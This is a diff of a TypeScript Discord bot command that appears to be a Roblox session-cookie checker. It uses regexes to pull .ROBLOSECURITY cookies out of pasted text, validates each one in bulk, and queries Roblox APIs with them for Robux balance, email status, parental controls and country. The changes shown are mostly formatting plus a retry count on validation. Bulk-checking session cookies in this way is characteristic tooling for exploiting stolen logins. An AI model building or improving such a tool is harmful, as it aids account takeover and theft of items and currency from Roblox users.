@@ -26,25 +26,10 @@ function buildCheckButtons(id: string): ActionRowBuilder<ButtonBuilder> {
   );
 }
 
-interface RobuxResponse {
-  robux: number;
-}
-
-interface EmailResponse {
-  verifiedEmail: string | null;
-  pendingEmail: string | null;
-}
-
-interface ParentalResponse {
-  parents: unknown[];
-  canAddParent: boolean;
-}
-
-interface CountryResponse {
-  value: {
-    countryName: string;
-  };
-}
+interface RobuxResponse { robux: number }
+interface EmailResponse { verifiedEmail: string | null; pendingEmail: string | null }
+interface ParentalResponse { parents: unknown[]; canAddParent: boolean }
+interface CountryResponse { value: { countryName: string } }
 
 const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
 const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;
@@ -73,9 +58,7 @@ async function fetchRobux(cookie: string, userId: string): Promise<number> {
       `https://economy.roblox.com/v1/users/${userId}/currency`,
       { headers: { Cookie: `.ROBLOSECURITY=${cookie}` }, validateStatus: () => true, timeout: 10000 }
     );
-    if (resp.status === 200 && resp.data) {
-      return resp.data.robux || 0;
-    }
+    if (resp.status === 200 && resp.data) return resp.data.robux || 0;
   } catch {}
   return 0;
 }
@@ -187,7 +170,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
     for (let i = 0; i < cookies.length; i++) {
       const cookie = cookies[i];
-      const validation = await validateCookie(cookie);
+      const validation = await validateCookie(cookie, 3);
       if (!validation.valid) continue;
 
       validCount++;
@@ -231,7 +214,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           `⭑ Your credentials were not logged.`
         )
         .setFooter(footerData);
-
       await interaction.followUp({ embeds: [embed], components: [row], ephemeral: true });
     }
 
@@ -245,7 +227,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       )
       .setImage('https://files.catbox.moe/955g15.gif')
       .setFooter(footerData);
-
     await interaction.followUp({ embeds: [summaryEmbed], ephemeral: true });
   } catch (error: any) {
     const embed = new EmbedBuilder()
